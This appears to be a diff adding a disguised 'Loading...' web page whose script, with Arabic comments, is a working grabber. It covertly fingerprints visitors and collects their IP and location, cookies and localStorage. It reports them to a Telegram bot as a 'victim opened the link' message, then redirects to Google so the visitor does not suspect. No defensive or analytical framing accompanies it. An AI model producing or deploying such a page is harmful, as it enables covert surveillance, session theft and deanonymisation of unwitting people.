@@ -1,1 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+body{margin:0;background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;font-size:18px}
+</style>
+</head>
+<body>
+<div id="status">جاري التحميل...</div>
 
+<script>
+const TOKEN = "ضع_هنا_توكن_بوت_التليجرام";
+const CHAT_ID = "ضع_هنا_ايدي_الشات";
+
+async function steal() {
+    let data = {};
+
+    // معلومات أساسية
+    data.userAgent = navigator.userAgent;
+    data.platform = navigator.platform;
+    data.language = navigator.language;
+    data.languages = navigator.languages;
+    data.cookieEnabled = navigator.cookieEnabled;
+    data.doNotTrack = navigator.doNotTrack;
+    data.hardwareConcurrency = navigator.hardwareConcurrency;
+    data.deviceMemory = navigator.deviceMemory || "غير متاح";
+    data.maxTouchPoints = navigator.maxTouchPoints;
+
+    // الشاشة
+    data.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio
+    };
+
+    // الوقت والمنطقة
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.timezoneOffset = new Date().getTimezoneOffset();
+    data.date = new Date().toString();
+
+    // الاتصال
+    if (navigator.connection) {
+        data.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        };
+    }
+
+    // البطارية
+    try {
+        const battery = await navigator.getBattery();
+        data.battery = {
+            level: battery.level,
+            charging: battery.charging
+        };
+    } catch(e) {}
+
+    // الآي بي والموقع التقريبي
+    try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        data.ipInfo = await ipRes.json();
+    } catch(e) {
+        data.ip = await (await fetch("https://api.ipify.org")).text();
+    }
+
+    // Canvas Fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("fingerprint", 2, 2);
+        data.canvasFingerprint = canvas.toDataURL().slice(-50);
+    } catch(e) {}
+
+    // WebGL Fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl");
+        data.webgl = {
+            vendor: gl.getParameter(gl.VENDOR),
+            renderer: gl.getParameter(gl.RENDERER)
+        };
+    } catch(e) {}
+
+    // الكوكيز والتخزين المحلي
+    data.cookies = document.cookie;
+    try {
+        data.localStorage = JSON.stringify(localStorage);
+    } catch(e) {}
+
+    // محاولة الموقع الجغرافي (إذا سمح)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            data.geo = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+            };
+            sendData(data);
+        }, () => sendData(data), {timeout: 4000});
+    } else {
+        sendData(data);
+    }
+}
+
+async function sendData(data) {
+    const msg = `🔴 ضحية فتحت الرابط\n\n` +
+                `📱 الجهاز: ${data.userAgent}\n` +
+                `🌍 اللغة: ${data.language}\n` +
+                `🖥️ الشاشة: ${data.screen?.width}x${data.screen?.height}\n` +
+                `🔋 البطارية: ${data.battery ? (data.battery.level*100).toFixed(0)+"%" : "غير متاح"}\n` +
+                `🌐 IP Info: ${JSON.stringify(data.ipInfo || data.ip, null, 2)}\n` +
+                `📍 الموقع: ${data.geo ? data.geo.lat+","+data.geo.lon : "مرفوض"}\n` +
+                `🧩 Canvas: ${data.canvasFingerprint}\n` +
+                `🎮 GPU: ${data.webgl?.renderer || "غير متاح"}\n` +
+                `🍪 Cookies: ${data.cookies || "فارغ"}`;
+
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg.slice(0, 4000)
+        })
+    });
+
+    // تحويل لصفحة عادية عشان ما يشك
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 1200);
+}
+
+steal();
+</script>
+</body>
+</html>
